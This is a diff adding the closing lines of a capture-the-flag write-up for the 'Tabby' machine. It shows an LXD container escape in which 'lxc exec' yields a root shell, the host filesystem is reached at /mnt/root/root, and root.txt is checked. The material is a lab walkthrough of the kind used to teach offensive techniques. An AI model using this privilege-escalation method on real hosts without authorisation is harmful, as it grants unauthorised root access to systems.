@@ -198,3 +198,15 @@ To do that I downloaded **alpine** image to the machine which is preconfigured a
 
 ![lxd](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/tabby-writeup/lxd.png)
 
+This way I can now exeucute ``/bin/bash`` to the container and navigate to the filesystem to read the flag :
+
+```sh
+ash@tabby:~$ lxc exec ignite /bin/sh
+~ # id
+uid=0(root) gid=0(root)
+~ # cd /mnt/root/root
+cd /mnt/root/root
+/mnt/root/root # wc -c root.txt
+wc -c root.txt
+33 root.txt
+```
